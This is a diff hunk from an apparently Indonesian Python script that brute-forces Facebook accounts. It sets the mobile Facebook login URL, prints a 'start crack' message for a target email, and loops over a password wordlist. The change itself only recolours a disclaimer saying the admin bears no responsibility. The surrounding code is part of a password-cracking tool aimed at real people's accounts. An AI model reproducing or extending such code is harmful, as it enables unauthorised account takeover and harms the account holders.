@@ -75,7 +75,7 @@ else:
           url = 'https://m.facebook.com/login.php'
           os.system('clear')
           print(REZA)
-          print('\n\033[37;1m[\033[31;1m!\033[37;1m] Gunakanlah Sc Ini Dengan Bijak Karena \033[31;1mAdmin Tidak Bertanggung Jawab!!')
+          print('\n\033[37;1m[\033[31;1m!\033[37;1m] Gunakanlah Sc Ini Dengan Bijak Karena \033[31;1mAdmin \033[37;1mTidak Bertanggung Jawab\033[31;1m!!!')
           print('\n\033[37;1m[\033[31;1m!\033[37;1m]Mulai Crack \033[35;1m: '+ email)
           arq = open(word, 'r').readlines()
           for line in arq:
